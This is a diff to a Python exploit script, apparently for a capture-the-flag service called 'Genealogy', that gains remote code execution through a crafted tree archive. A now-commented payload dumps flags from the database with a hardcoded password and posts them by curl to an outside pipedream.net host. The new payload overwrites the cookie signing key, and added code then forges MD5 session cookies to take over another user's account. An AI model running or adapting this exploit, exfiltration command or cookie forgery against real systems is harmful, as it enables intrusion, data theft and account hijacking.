@@ -1,5 +1,6 @@
 #!/usr/bin/env python3
 import asyncio
+import hashlib
 import itertools
 import random
 import string
@@ -10,8 +11,8 @@ from pwn import ELF
 
 from client import GenealogyClient
 
-# PAYLOAD = b"/bin/sh -c 'ls -la'"
-PAYLOAD = b"apt-get install -y postgresql-client; echo 'SELECT title FROM genealogy_trees;' | PGPASSWORD=genealogy psql -h database -p 6432 -U genealogy genealogy | grep -oP '\w{10,}=' > flags.txt; curl --data @flags.txt https://enye1l83zkkqe5m.m.pipedream.net/flags"
+# PAYLOAD = b"apt-get install -y postgresql-client; echo 'SELECT title FROM genealogy_trees;' | PGPASSWORD=genealogy psql -h database -p 6432 -U genealogy genealogy | grep -oP '\w{10,}=' > flags.txt; curl --data @flags.txt https://enye1l83zkkqe5m.m.pipedream.net/flags"
+PAYLOAD = b"echo -n a > ./keys/cookie.key"
 assert len(PAYLOAD) < 60 * 8
 
 PORT = 8888
@@ -94,8 +95,8 @@ async def generate_first_archive(endpoint: str) -> tuple[int, bytes, bytes]:
     # 60 is max size of owners list
     payload = generate_payload(60)
 
-    # 0x257 is desired total length, 397 is a total size of other fields (may change if you change PAYLOAD)
-    description_length = 0x257 - 397
+    # 0x257 is desired total length, 172 is a total size of other fields (may change if you change PAYLOAD)
+    description_length = 0x257 - 172
 
     async with GenealogyClient(endpoint) as client:
         user_id = await client.create_user(login, password)
@@ -206,7 +207,20 @@ async def rce(endpoint: str, libc_address: int):
     print_bytes_hex(hacked_archive)
     async with GenealogyClient(endpoint) as client:
         await client.login(login2, password2)
-        await client.check_tree_archive(hacked_archive)
+        try:
+            await client.check_tree_archive(hacked_archive)
+        except:
+            pass
+
+    # if PAYLOAD has been run, then we know signing key, so we can hijack cookies
+    print("Enter flag id (user id from the service)")
+    user_id = int(input())
+
+    user_hash_cookie = hashlib.md5(b"a" + str(user_id).encode() + b"a").hexdigest()
+    async with GenealogyClient(endpoint) as client:
+        print({"user_id": str(user_id), "user_hash": user_hash_cookie})
+        r = await client.client.get("/tree", cookies={"user_id": str(user_id), "user_hash": user_hash_cookie})
+    print(r.json())
 
 
 async def temp(endpoint):
